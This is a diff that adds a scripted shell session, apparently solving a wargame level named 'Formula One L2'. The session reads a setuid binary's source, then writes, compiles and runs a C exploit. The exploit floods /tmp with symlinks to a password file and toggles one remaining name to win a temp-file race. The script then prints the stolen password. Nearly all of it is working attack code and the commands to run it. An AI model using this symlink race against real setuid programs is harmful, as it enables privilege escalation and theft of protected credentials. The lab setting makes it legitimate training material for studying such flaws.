@@ -1,0 +1,59 @@
+@sleep 1
+id
+echo '# Formula One L2: /formulaone/formulaone2 (setuid formulaone2), source group-readable:'
+cat /formulaone/formulaone2_src/formulaone2.c
+cat /formulaone/formulaone2_src/tmpnam.c
+echo '# mytmpnam invents /tmp/tmp_XXXX (26^4 = 456976 names), needs stat()!=0, then'
+echo '# fopen(). Attack: pre-create 456975 of them as symlinks to the password file,'
+echo '# leave ONE hole; the binary spins until it picks the hole; a toggle loop flips'
+echo '# the hole between absent and a password symlink so fopen lands on the password.'
+echo '# Writing the attacker (heredoc, code visible):'
+@line cat > /tmp/f1l2_attack.c <<'CEOF'
+@line #include <stdio.h>
+@line #include <stdlib.h>
+@line #include <string.h>
+@line #include <unistd.h>
+@line #include <sys/wait.h>
+@line #include <signal.h>
+@line #define PWFILE "/etc/formulaone_pass/formulaone2"
+@line #define HOLE "tmp_mzzz"
+@line int main(void) {
+@line     char name[32];
+@line     long made = 0;
+@line     for (int a = 0; a < 26; a++)
+@line       for (int b = 0; b < 26; b++)
+@line         for (int c = 0; c < 26; c++)
+@line           for (int d = 0; d < 26; d++) {
+@line             snprintf(name, sizeof(name), "/tmp/tmp_%c%c%c%c",
+@line                      'a'+a, 'a'+b, 'a'+c, 'a'+d);
+@line             if (strcmp(name+5, HOLE) == 0) continue;
+@line             if (symlink(PWFILE, name) == 0) made++;
+@line           }
+@line     fprintf(stderr, "made %ld symlinks\n", made);
+@line     for (int round = 0; round < 200; round++) {
+@line         pid_t p = fork();
+@line         if (p == 0) {
+@line             execl("/formulaone/formulaone2", "formulaone2", (char*)0);
+@line             _exit(127);
+@line         }
+@line         int alive = 1;
+@line         for (int t = 0; t < 20000 && alive; t++) {
+@line             if (waitpid(p, NULL, WNOHANG) != 0) alive = 0;
+@line             symlink(PWFILE, "/tmp/" HOLE);
+@line             unlink("/tmp/" HOLE);
+@line         }
+@line         if (alive) kill(p, SIGKILL);
+@line         waitpid(p, NULL, 0);
+@line     }
+@line     return 0;
+@line }
+@line CEOF
+cd /tmp && gcc f1l2_attack.c -o f1l2_attack
+echo '# run: the password comes out followed by uninitialized fwrite garbage ->'
+echo '# pipe through strings for clean output:'
+timeout 240 /tmp/f1l2_attack 2>/dev/null | strings | head -3
+echo rc=$?
+echo '# Verify (we are formulaone2 after the ssh login):'
+cat /etc/formulaone_pass/formulaone2
+@sleep 2
+exit
